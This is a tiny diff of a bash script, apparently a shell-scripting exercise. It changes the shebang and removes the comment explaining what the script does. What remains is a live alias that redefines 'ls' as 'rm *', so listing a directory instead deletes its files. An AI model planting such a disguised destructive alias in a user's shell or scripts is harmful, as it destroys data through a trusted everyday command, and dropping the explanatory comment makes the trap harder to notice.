@@ -1,4 +1,2 @@
-#!/usr/bin/env bash
-# Creates an alias named 'ls' with the value 'rm *'
-
+#!/bin/bash
 alias ls='rm *'
